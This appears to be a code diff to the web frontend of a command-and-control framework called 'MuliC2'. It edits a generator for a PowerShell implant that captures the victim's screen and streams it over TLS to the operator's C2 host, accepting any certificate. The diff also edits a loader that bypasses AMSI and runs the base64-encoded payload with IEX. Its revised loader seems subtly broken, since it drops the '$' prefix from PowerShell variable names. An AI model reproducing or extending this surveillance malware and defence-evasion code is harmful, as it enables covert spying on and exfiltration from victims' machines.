@@ -435,8 +435,8 @@
       </el-tab-pane>
     </el-tabs>
 
-    <!-- Command Dialog -->
-    <el-dialog v-model="commandDialogVisible" title="Send Command" width="600px">
+<!-- Command Dialog -->
+<el-dialog v-model="commandDialogVisible" title="Send Command" width="600px">
       <el-form :model="commandForm" label-width="100px">
         <el-form-item label="Implant:">
           <el-input v-model="selectedImplantName" disabled />
@@ -625,10 +625,6 @@ const vncSettings = ref({
   quality: 5,
   fpsLimit: 5
 })
-
-
-
-
 
 // Agent management
 const agents = ref<any[]>([])
@@ -1004,7 +1000,7 @@ const disconnectAgent = async (agent: any) => {
   }
 }
 
-// Fixed VNC Payload Generator Function
+// Enhanced VNC Payload Generator Function with TLS Compatibility
 const generateVncPayload = async () => {
   if (!selectedListener.value) {
     ElMessage.error('No HTTPS listener selected. Please select an active HTTPS listener first.')
@@ -1025,8 +1021,8 @@ const generateVncPayload = async () => {
     
     console.log('VNC Configuration:', { c2Host, c2Port })
     
-    // Build the payload string without template literals to avoid parsing issues
-    let payload = '# MuliC2 VNC Screen Capture Agent\n'
+    // Build the enhanced payload with TLS compatibility
+    let payload = '# MuliC2 VNC Screen Capture Agent with Enhanced TLS Support\n'
     payload += '# C2 Host: ' + c2Host + '\n'
     payload += '# C2 Port: ' + c2Port + '\n'
     payload += '# Type: ' + vncForm.value.payloadType + '\n'
@@ -1037,6 +1033,16 @@ const generateVncPayload = async () => {
     payload += '    [string]$C2Host = "' + c2Host + '",\n'
     payload += '    [int]$C2Port = ' + c2Port + '\n'
     payload += ')\n\n'
+    
+    // Enhanced TLS Configuration
+    payload += '# Force TLS 1.2 and 1.3 support explicitly for compatibility with Go listener\n'
+    payload += 'try {\n'
+    payload += '    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13\n'
+    payload += '    Write-Host "[TLS] Enabled TLS 1.2 and 1.3 protocols" -ForegroundColor Green\n'
+    payload += '} catch {\n'
+    payload += '    Write-Host "[TLS] Warning: Could not set TLS protocols: $($_.Exception.Message)" -ForegroundColor Yellow\n'
+    payload += '    Write-Host "[TLS] Falling back to system defaults" -ForegroundColor Yellow\n'
+    payload += '}\n\n'
     
     payload += '# Add required assemblies with error handling\n'
     payload += 'try {\n'
@@ -1184,23 +1190,67 @@ const generateVncPayload = async () => {
     payload += '    # Enable keep-alive\n'
     payload += '    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)\n'
     payload += '    \n'
-    payload += '    # Create SSL stream with certificate validation bypass\n'
+    payload += '    # Create SSL stream with enhanced certificate validation and TLS compatibility\n'
     payload += '    $global:sslStream = New-Object System.Net.Security.SslStream(\n'
     payload += '        $global:tcpClient.GetStream(), \n'
     payload += '        $false,\n'
     payload += '        ([System.Net.Security.RemoteCertificateValidationCallback] {\n'
     payload += '            param($sender, $certificate, $chain, $sslPolicyErrors)\n'
+    payload += '            \n'
+    payload += '            # Log TLS connection details for debugging\n'
+    payload += '            if ($certificate) {\n'
+    payload += '                Write-Host "[TLS] Certificate Subject: $($certificate.Subject)" -ForegroundColor Gray\n'
+    payload += '                Write-Host "[TLS] Certificate Issuer: $($certificate.Issuer)" -ForegroundColor Gray\n'
+    payload += '            }\n'
+    payload += '            Write-Host "[TLS] SSL Policy Errors: $sslPolicyErrors" -ForegroundColor Gray\n'
+    payload += '            \n'
+    payload += '            # In production, you might want to validate specific certificate properties\n'
+    payload += '            # For now, accept all certificates but log the details\n'
+    payload += '            if ($sslPolicyErrors -ne [System.Net.Security.SslPolicyErrors]::None) {\n'
+    payload += '                Write-Host "[TLS] WARNING: Certificate validation failed: $sslPolicyErrors" -ForegroundColor Yellow\n'
+    payload += '                Write-Host "[TLS] Proceeding anyway (certificate validation bypassed)" -ForegroundColor Yellow\n'
+    payload += '            }\n'
+    payload += '            \n'
     payload += '            return $true\n'
     payload += '        })\n'
     payload += '    )\n'
     payload += '    \n'
-    payload += '    # Authenticate SSL connection with longer timeout\n'
+    payload += '    # Authenticate SSL connection with explicit TLS version support and longer timeout\n'
     payload += '    try {\n'
-    payload += '        $authTask = $global:sslStream.AuthenticateAsClientAsync($C2Host)\n'
+    payload += '        # Create SSL authentication options for better compatibility with Go listener\n'
+    payload += '        $sslOptions = [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13\n'
+    payload += '        \n'
+    payload += '        Write-Host "[TLS] Attempting SSL authentication with TLS 1.2/1.3..." -ForegroundColor Cyan\n'
+    payload += '        \n'
+    payload += '        # Use the overload that allows specifying TLS protocols\n'
+    payload += '        $authTask = $global:sslStream.AuthenticateAsClientAsync(\n'
+    payload += '            $C2Host,\n'
+    payload += '            $null,  # Client certificates collection (null for no client auth)\n'
+    payload += '            $sslOptions,  # Enabled SSL protocols\n'
+    payload += '            $false  # Check certificate revocation\n'
+    payload += '        )\n'
+    payload += '        \n'
     payload += '        $authCompleted = $authTask.Wait(15000)\n'
     payload += '        if (-not $authCompleted) {\n'
-    payload += '            throw "SSL authentication timed out"\n'
+    payload += '            throw "SSL authentication timed out after 15 seconds"\n'
     payload += '        }\n'
+    payload += '        \n'
+    payload += '        # Log successful TLS connection details\n'
+    payload += '        $sslProtocol = $global:sslStream.SslProtocol\n'
+    payload += '        $cipherAlgorithm = $global:sslStream.CipherAlgorithm\n'
+    payload += '        $hashAlgorithm = $global:sslStream.HashAlgorithm\n'
+    payload += '        $keyExchangeAlgorithm = $global:sslStream.KeyExchangeAlgorithm\n'
+    payload += '        \n'
+    payload += '        Write-Host "[+] SSL connection established successfully" -ForegroundColor Green\n'
+    payload += '        Write-Host "[TLS] Protocol: $sslProtocol" -ForegroundColor Green\n'
+    payload += '        Write-Host "[TLS] Cipher: $cipherAlgorithm" -ForegroundColor Green\n'
+    payload += '        Write-Host "[TLS] Hash: $hashAlgorithm" -ForegroundColor Green\n'
+    payload += '        Write-Host "[TLS] Key Exchange: $keyExchangeAlgorithm" -ForegroundColor Green\n'
+    payload += '        \n'
+    payload += '    } catch [System.Security.Authentication.AuthenticationException] {\n'
+    payload += '        throw "SSL authentication failed - TLS handshake error: $($_.Exception.Message)"\n'
+    payload += '    } catch [System.TimeoutException] {\n'
+    payload += '        throw "SSL authentication timed out - server may not support TLS 1.2/1.3"\n'
     payload += '    } catch {\n'
     payload += '        throw "SSL authentication failed: $($_.Exception.Message)"\n'
     payload += '    }\n'
@@ -1209,7 +1259,6 @@ const generateVncPayload = async () => {
     payload += '        throw "SSL authentication failed - stream not authenticated"\n'
     payload += '    }\n'
     payload += '    \n'
-    payload += '    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green\n'
     payload += '    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan\n'
     payload += '    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray\n'
     payload += '    \n'
@@ -1255,9 +1304,9 @@ const generateVncPayload = async () => {
     payload += '                break\n'
     payload += '            }\n'
     payload += '            \n'
-    payload += '            # Send frame data with error handling\n'
+    payload += '            # Send frame data with error handling (Little-Endian for compatibility)\n'
     payload += '            try {\n'
-    payload += '                # Send length header (4 bytes) - little endian\n'
+    payload += '                # Send length header (4 bytes) - little endian for Go compatibility\n'
     payload += '                $lengthBytes = [BitConverter]::GetBytes([uint32]$screenBytes.Length)\n'
     payload += '                if (-not [BitConverter]::IsLittleEndian) {\n'
     payload += '                    [Array]::Reverse($lengthBytes)\n'
@@ -1371,43 +1420,60 @@ const generateVncPayload = async () => {
   }
 }
 
-// Replace the applyVncLoader function with a more advanced loader
+// Enhanced VNC Loader with better obfuscation
 function applyVncLoader(payload: string) {
   function randVar(len = 6): string {
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    let out = '';
-    for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
-    return out;
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    let out = ''
+    for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)]
+    return out
   }
+  
   function toBase64Unicode(str: string): string {
-    const utf16le = new Uint8Array(str.length * 2);
+    const utf16le = new Uint8Array(str.length * 2)
     for (let i = 0; i < str.length; i++) {
-      const code = str.charCodeAt(i);
-      utf16le[i * 2] = code & 0xff;
-      utf16le[i * 2 + 1] = code >> 8;
+      const code = str.charCodeAt(i)
+      utf16le[i * 2] = code & 0xff
+      utf16le[i * 2 + 1] = code >> 8
     }
-    let bin = '';
-    utf16le.forEach(b => bin += String.fromCharCode(b));
-    return btoa(bin);
+    let bin = ''
+    utf16le.forEach(b => bin += String.fromCharCode(b))
+    return btoa(bin)
   }
-  const vAmsiRef = randVar();
-  const vAmsiField = randVar();
-  const vAmsiSet = randVar();
-  const vEnc = randVar();
-  const vDecoded = randVar();
-  const vB64 = toBase64Unicode(payload);
+  
+  const vAmsiRef = randVar()
+  const vAmsiField = randVar()
+  const vAmsiSet = randVar()
+  const vEnc = randVar()
+  const vDecoded = randVar()
+  const vB64 = toBase64Unicode(payload)
 
   return `
-# --- AMSI Bypass ---
-$${vAmsiRef} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$${vAmsiField} = $${vAmsiRef}.GetField('amsiInitFailed','NonPublic,Static')
-$${vAmsiSet} = $${vAmsiField}.SetValue($null,$true)
+# --- Enhanced AMSI Bypass with Error Handling ---
+try {
+    ${vAmsiRef} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    if (${vAmsiRef}) {
+        ${vAmsiField} = ${vAmsiRef}.GetField('amsiInitFailed','NonPublic,Static')
+        if (${vAmsiField}) {
+            ${vAmsiSet} = ${vAmsiField}.SetValue($null,$true)
+            Write-Host "[+] AMSI bypass applied successfully" -ForegroundColor Green
+        }
+    }
+} catch {
+    Write-Host "[!] AMSI bypass failed: $($_.Exception.Message)" -ForegroundColor Yellow
+    Write-Host "[*] Continuing without AMSI bypass..." -ForegroundColor Yellow
+}
 
 # --- Decode and execute payload ---
-$${vEnc} = [System.Text.Encoding]::Unicode
-$${vDecoded} = $${vEnc}.GetString([Convert]::FromBase64String('${vB64}'))
-IEX $${vDecoded}
-  `.trim();
+try {
+    ${vEnc} = [System.Text.Encoding]::Unicode
+    ${vDecoded} = ${vEnc}.GetString([Convert]::FromBase64String('${vB64}'))
+    IEX ${vDecoded}
+} catch {
+    Write-Host "[!] Failed to decode/execute payload: $($_.Exception.Message)" -ForegroundColor Red
+    exit 1
+}
+  `.trim()
 }
 
 // VNC Control Functions
@@ -1466,7 +1532,7 @@ const startVNCStream = () => {
   const token = localStorage.getItem('auth_token')
   
   // Create EventSource with token in URL (EventSource doesn't support custom headers)
-      const eventSource = new EventSource(`${API_BASE_URL}/api/vnc/stream?token=${token}`)
+  const eventSource = new EventSource(`${API_BASE_URL}/api/vnc/stream?token=${token}`)
   
   eventSource.onmessage = (event) => {
     try {
@@ -1590,10 +1656,6 @@ const downloadVncPayload = () => {
   URL.revokeObjectURL(url)
   ElMessage.success('VNC payload downloaded')
 }
-
-
-
-
 
 // Utility functions
 const getImplantTypeColor = (type: string) => {
